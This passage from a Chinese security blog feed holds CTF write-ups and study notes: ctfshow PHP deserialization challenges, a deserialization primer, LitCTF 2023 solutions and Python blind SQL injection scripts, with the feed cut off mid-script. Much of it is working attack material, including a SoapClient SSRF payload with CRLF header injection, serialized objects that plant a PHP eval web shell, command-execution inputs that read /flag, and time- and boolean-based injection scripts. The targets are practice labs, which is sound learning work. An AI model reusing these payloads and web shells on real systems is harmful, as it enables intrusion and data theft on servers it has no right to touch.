就能把flag写到flag.txt中了。</p><p>ssrf漏洞在哪呢，这就得用到我们前面提到的SoapClient类了。这个类中有个__call魔术方法（当调用不存在的方法时触发），会调用SoapClient类的构造方法。</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;<br><span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;token=ctfshow&#x27;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded&#x27;</span>.<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>.(<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt; <span class="hljs-string">&quot;ssrf&quot;</span>));<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>get传vip&#x3D;xxx就可以了，最后访问&#x2F;flag.txt应该就能拿到flag了</p><h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><p>序列化出来的东西需要包含字符串ctfshow_i_love_36D，<br>那我们直接传ctfhsow&#x3D;ctfshow_i_love_36D就可以了。</p><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><p>打下来和redis好像没什么关系.</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">如果类中同时定义了 <span class="hljs-built_in">__unserialize</span>() 和 <span class="hljs-built_in">__wakeup</span>() 两个魔术方法，<br>则只有 <span class="hljs-built_in">__unserialize</span>() 方法会生效，<span class="hljs-built_in">__wakeup</span>() 方法会被忽略。<br><br>当反序列化时会进入__unserialize中，而且也没有什么方法可以进入到__invoke中。所以直接就朝着写文件搞就可以了。<br></code></pre></td></tr></table></figure><p>只要满足code&#x3D;&#x3D;0x36d(877)就可以了。<br>而code是username和password拼接出来的。<br>所以只要username&#x3D;877.php password&#x3D;shell就可以了。<br>877.php&#x3D;&#x3D;877是成立的（弱类型比较）</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowvip</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>&#125;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshowvip</span>(<span class="hljs-string">&#x27;877.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><h2 id="web261-1"><a href="#web261-1" class="headerlink" title="web261"></a>web261</h2><p>有个message.php页面,我们看到，需要token为admin才能输出flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-built_in">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>payload:</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>       <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>       <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>       <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>   &#125;<br>&#125;<br><span class="hljs-variable">$f</span> = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$m</span> = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$t</span> = <span class="hljs-string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span>);<br><span class="hljs-variable">$umsg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$umsg</span> ;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$umsg</span>);<br></code></pre></td></tr></table></figure><p>把base64编码后的结果放到cookie里面访问message.php就能拿到flag</p>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化</title>
    <link href="/2023/05/20/web%E5%AD%A6%E4%B9%A0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/05/20/web%E5%AD%A6%E4%B9%A0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>序列化是将对象转换为字符串以便存储传输的一种方式。而反序列化恰好就是序列化的逆过程,反序列化会将字符串转换为对象供程序使用。在PHP中序列化和反序列化对应的函数分别为serialize()和unserialize()。</p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>当程序在进行反序列化时，会自动调用一些函数，例如<code>__wakeup(),__destruct()</code>等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。</p><h3 id="序列化函数（serialize）"><a href="#序列化函数（serialize）" class="headerlink" title="序列化函数（serialize）"></a>序列化函数（serialize）</h3><p>当我们在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，用于保存对象的值方便之后的传递与使用。</p><h3 id="反序列化-unserialize"><a href="#反序列化-unserialize" class="headerlink" title="反序列化(unserialize)"></a>反序列化(unserialize)</h3><p>​    unserialize()可以从序列化后的结果中恢复对象（object）为了使用这个对象，在下列代码中用unserialize重建对象.</p><h3 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>. <span class="hljs-built_in">__sleep</span>() <span class="hljs-comment">//在对象被序列化之前运行</span><br><span class="hljs-number">2</span>. <span class="hljs-built_in">__wakeup</span>() <span class="hljs-comment">//将在反序列化之后立即调用（当反序列化时变量个数与实   际不符是会绕过）</span><br><span class="hljs-number">3</span>. <span class="hljs-built_in">__construct</span>() <span class="hljs-comment">//当对象被创建时，会触发进行初始化</span><br><span class="hljs-number">4</span>. <span class="hljs-built_in">__destruct</span>() <span class="hljs-comment">//对象被销毁时触发</span><br><span class="hljs-number">5</span>. <span class="hljs-built_in">__toString</span>()： <span class="hljs-comment">//当一个对象被当作字符串使用时触发</span><br><span class="hljs-number">6</span>. <span class="hljs-built_in">__call</span>() <span class="hljs-comment">//在对象上下文中调用不可访问的方法时触发</span><br><span class="hljs-number">7</span>. <span class="hljs-built_in">__callStatic</span>() <span class="hljs-comment">//在静态上下文中调用不可访问的方法时触发</span><br><span class="hljs-number">8</span>. <span class="hljs-built_in">__get</span>() <span class="hljs-comment">//获得一个类的成员变量时调用,用于从不可访问的属性读取数   据</span><br><span class="hljs-number">9</span>. <span class="hljs-built_in">__set</span>() <span class="hljs-comment">//用于将数据写入不可访问的属性</span><br><span class="hljs-number">10</span>. <span class="hljs-built_in">__isset</span>() <span class="hljs-comment">//在不可访问的属性上调用isset()或empty()触发</span><br><span class="hljs-number">11</span>. <span class="hljs-built_in">__unset</span>() <span class="hljs-comment">//在不可访问的属性上使用unset()时触发</span><br><span class="hljs-number">12</span>. <span class="hljs-built_in">__toString</span>() <span class="hljs-comment">//把类当作字符串使用时触发</span><br><span class="hljs-number">13</span>. <span class="hljs-built_in">__invoke</span>() <span class="hljs-comment">//当脚本尝试将对象调用为函数时触发</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>litctf 2023</title>
    <link href="/2023/05/15/%E6%AF%94%E8%B5%9B/%5Blitctf%202023%5D/"/>
    <url>/2023/05/15/%E6%AF%94%E8%B5%9B/%5Blitctf%202023%5D/</url>
    
    <content type="html"><![CDATA[<h3 id="LitCTF-2023-Vim-yyds"><a href="#LitCTF-2023-Vim-yyds" class="headerlink" title="[LitCTF 2023]Vim yyds"></a>[LitCTF 2023]Vim yyds</h3><p>访问：.index.php.swp<br>下载下来</p><p>恢复文件：<br>vim -r .index.php.swp<br>或者vi -r .index.php.swp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>            <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>            <span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;Give_Me_Your_Flag&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$password</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;</span>;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]));<br>            &#125;<br>            <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Give_Me_Your_Flag<br>base64编码：R2l2ZV9NZV9Zb3VyX0ZsYWc&#x3D;<br>POST传入：<br>password&#x3D;R2l2ZV9NZV9Zb3VyX0ZsYWc&#x3D;&amp;cmd&#x3D;cat &#x2F;flag<br>NSSCTF{1c21591c-7690-47ee-8426-54f79824f06d}</p><h3 id="LitCTF-2023-Http-pro-max-plus"><a href="#LitCTF-2023-Http-pro-max-plus" class="headerlink" title="[LitCTF 2023]Http pro max plus]"></a>[LitCTF 2023]Http pro max plus]</h3><p>1.只允许本地访问      即需要伪造ip为本地<br><code>ip伪装的方法 Client-Ip: 127.0.0.1 X-Forwarded-For: 127.0.0.1</code><br>使用xff方法无法通过<br>在请求头中加上Client-Ip: 127.0.0.1后通过</p><p>2.You are not from pornhub.com !（即伪造Referer）<br>加上Referer： pornhub.com后通过</p><p>3.用Chrome浏览器啊!（即伪造User-Agent）<br>加上User-Agent: Chrome 后通过</p><p>4.不开代理你想上p站？代理服务器地址是Clash.win（伪造Via）<br>加上Via: Clash.win后通过</p><p><code>借一步说话---&gt;&gt;  /wtfwtfwtfwtf.php</code></p><img src="/2023/05/15/%EF%BF%BD%5B/%5Blitctf%202023%5D/D1R%257WGW)%252KB5KPP4Y4GBU.png" class title="This is an test image"><p>查看源码，得到<br><code>&lt;!--你就冲吧，什么都冲只会害了你自己 bdy好康的在 /sejishikong.php--&gt;</code></p><p>访问得到flag</p><h3 id="LitCTF-2023-导弹迷踪【js信息泄露】"><a href="#LitCTF-2023-导弹迷踪【js信息泄露】" class="headerlink" title="[LitCTF 2023]导弹迷踪【js信息泄露】"></a>[LitCTF 2023]导弹迷踪【js信息泄露】</h3><p>查看源码，找到一个js文件夹</p><p>其内发现了：F|L|A|G {y0u_w1n_th1s_!!!}<br>text: function () {if (mLevel &#x3D;&#x3D;&#x3D; 6) {return ‘GOT F|L|A|G {y0u_w1n_th1s_!!!}’;} else {return ‘CLICK TO CONTINUE’;}},</p><p>因此flag：F|L|A|G {y0u_w1n_th1s_!!!}<br>注意：提交的格式为NSSCTF{y0u_w1n_th1s_!!!}</p><h3 id="LitCTF-2023-PHP是世界上最好的语言！！【代码执行-getshell】"><a href="#LitCTF-2023-PHP是世界上最好的语言！！【代码执行-getshell】" class="headerlink" title="[LitCTF 2023]PHP是世界上最好的语言！！【代码执行 getshell】"></a>[LitCTF 2023]PHP是世界上最好的语言！！【代码执行 getshell】</h3><p>system(‘ls’);<br>system(‘pwd’);<br>system(‘find &#x2F; -name flag*’);<br>system(‘cat &#x2F;flag’);<br>&#x2F;&#x2F;POWERFUL PHP TOOL<br>flag&#x3D;NSSCTF{43fc5c29-e6b5-44f7-92d6-b2bef957a27c}</p><h3 id="LitCTF-2023-作业管理系统【创建文件-getshell】"><a href="#LitCTF-2023-作业管理系统【创建文件-getshell】" class="headerlink" title="[LitCTF 2023]作业管理系统【创建文件 getshell】"></a>[LitCTF 2023]作业管理系统【创建文件 getshell】</h3><p>admin&#x2F;admin登录<br>创建文件：cc.php</p><?php eval($_POST['cc']);?><p>蚁剑连接即可找到根目录的flag<br>flag&#x3D;NSSCTF{959f0158-c22a-471b-8926-879171fae14c}</p><h3 id="LitCTF-2023-1zjs【js信息泄露】"><a href="#LitCTF-2023-1zjs【js信息泄露】" class="headerlink" title="[LitCTF 2023]1zjs【js信息泄露】"></a>[LitCTF 2023]1zjs【js信息泄露】</h3><p>查看源码，发现注释：&#x2F;<a href="mailto:&#x66;&#64;&#x6b;&#51;&#x66;&#49;&#97;&#x67;&#46;&#112;&#x68;&#x70;">&#x66;&#64;&#x6b;&#51;&#x66;&#49;&#97;&#x67;&#46;&#112;&#x68;&#x70;</a><br>PERFORMANCE OF THIS SOFTWARE.Your gift just take it : &#x2F;<a href="mailto:&#102;&#x40;&#x6b;&#x33;&#x66;&#49;&#97;&#103;&#x2e;&#112;&#x68;&#x70;">&#102;&#x40;&#x6b;&#x33;&#x66;&#49;&#97;&#103;&#x2e;&#112;&#x68;&#x70;</a></p><p>访问：&#x2F;<a href="mailto:&#102;&#64;&#x6b;&#x33;&#x66;&#49;&#97;&#103;&#x2e;&#x70;&#x68;&#x70;">&#102;&#64;&#x6b;&#x33;&#x66;&#49;&#97;&#103;&#x2e;&#x70;&#x68;&#x70;</a>  得到加密的flag<br>找到jsfuck进行解密得到：NSSCTF{4[]b0[]8[]5[]0[]1[]6[]-8[]ace-4[]1[]0[]7[]-8[]4[]d0[]-1[]da4[]1[]ab1[]0[]8[]ba}</p><p>NSSCTF{4b085016-8ace-4107-84d0-1da41ab108ba}</p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入脚本笔记</title>
    <link href="/2023/05/11/web%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/05/11/web%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h2><h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs-master/Less-5/&quot;</span><br>right = <span class="hljs-string">&quot;You&quot;</span><br><br><span class="hljs-comment"># 注意缩写，python缩写</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">database_name</span>():<br>    name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>:<span class="hljs-comment"># 爆flag最好用ascii码，防止漏掉特殊字符</span><br>            payload = <span class="hljs-string">&quot;?id=1&quot;</span> <span class="hljs-keyword">and</span> substr((select database()),%d,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;%s&#x27;</span>--+<span class="hljs-string">&quot;% (i,j) </span><br><span class="hljs-string">            r = requests.get(url + payload)</span><br><span class="hljs-string">            if right in r.text:</span><br><span class="hljs-string">                name += j</span><br><span class="hljs-string">                print(name)</span><br><span class="hljs-string">database_name()</span><br></code></pre></td></tr></table></figure><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>python时间函数的学习</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> time<br>now = datetime.datetime.now() <span class="hljs-comment">#获取当前的时间</span><br>sleep(<span class="hljs-number">2</span>)<br>now1 = datetime.datetime.now() <span class="hljs-comment">#获取两秒后的时间</span><br>sec = (now1-now).seconds<br>   <span class="hljs-comment"># sec为2</span><br>   <span class="hljs-comment"># seconds获取的是仅仅是时间差的秒数，忽略微秒数，忽略天数。</span><br>   <span class="hljs-comment"># total_seconds()是获取两个时间之间的总差。</span><br>now2 = time.time() <span class="hljs-comment">#获取当前时间</span><br>sleep(<span class="hljs-number">2</span>)<br>now3 = time.time()  <span class="hljs-comment"># 不能用.seconds，因为这个是float型的</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> datetime<br>url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs-master/Less-9/&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database_len</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>):<br>        payload  = <span class="hljs-string">&quot;?id=1&#x27; and sleep(if(length((select database()))=%d,2,0))--+&quot;</span>% (i)<br>        start = datetime.datetime.now()<br>        response = requests.get(url+payload)<br>        end = datetime.datetime.now()<br>        tt = (end-start).seconds<br>        <span class="hljs-keyword">if</span> tt &gt;=<span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-keyword">return</span> i<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database_name</span>():<br>    number = get_database_len()<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,number+<span class="hljs-number">1</span>): <span class="hljs-comment"># 这个要加1，不然会少爆出一个字母</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>            payload = <span class="hljs-string">&quot;?id=1&#x27; and sleep(if(ascii(substr((select database()),%d,1))=%d,2,0))--+&quot;</span>%(i,j)<br>            start = datetime.datetime.now()<br>            re = requests.get(url+payload)<br>            end = datetime.datetime.now()<br>            ttt = (end - start).seconds <span class="hljs-comment"># 这个用.seconds使其整数化</span><br>            <span class="hljs-keyword">if</span> ttt &gt;=<span class="hljs-number">2</span>:<br>                name += <span class="hljs-built_in">chr</span>(j)<br>                <span class="hljs-built_in">print</span>(name)<br>get_database_name()<br><br><span class="hljs-comment">### 有个缺点，速度太慢，可以进行算法优化</span><br></code></pre></td></tr></table></figure><h2 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h2><h3 id="bool盲注-1"><a href="#bool盲注-1" class="headerlink" title="bool盲注"></a>bool盲注</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br>url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs-master/Less-13/&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_len_database</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">25</span>):<br>        payload = <span class="hljs-string">&quot;admin&#x27;) and length((select database()))=%d #&quot;</span>%(i)<br>        data = &#123;<span class="hljs-string">&quot;uname&quot;</span>:payload, <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;submit&quot;</span>:<span class="hljs-string">&quot;submit&quot;</span>&#125;<br>        html = requests.post(url=url, data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag.jpg&quot;</span> <span class="hljs-keyword">in</span> html.text:<br>            <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-keyword">return</span> i<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_name_database</span>():<br>    number = get_len_database()<br>    <span class="hljs-built_in">print</span>(number)<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,number+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>,<span class="hljs-number">130</span>):<br>            payload = <span class="hljs-string">&quot;admin&#x27;) and ascii(substr((select database()),%d,1))=%d#&quot;</span>%(i,j)<br>            data = &#123;<span class="hljs-string">&quot;uname&quot;</span>:payload,<span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;submit&quot;</span>:<span class="hljs-string">&quot;submit&quot;</span>&#125;<br>            html = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag.jpg&quot;</span> <span class="hljs-keyword">in</span> html.text:<br>                name += <span class="hljs-built_in">chr</span>(j)<br>                <span class="hljs-built_in">print</span>(name)<br>                <span class="hljs-keyword">if</span> i == number:<br>                    <span class="hljs-keyword">return</span> name<br>                <span class="hljs-keyword">break</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_name_table</span>():<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    result = get_name_database()<br>    <span class="hljs-built_in">print</span>(result)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>        <span 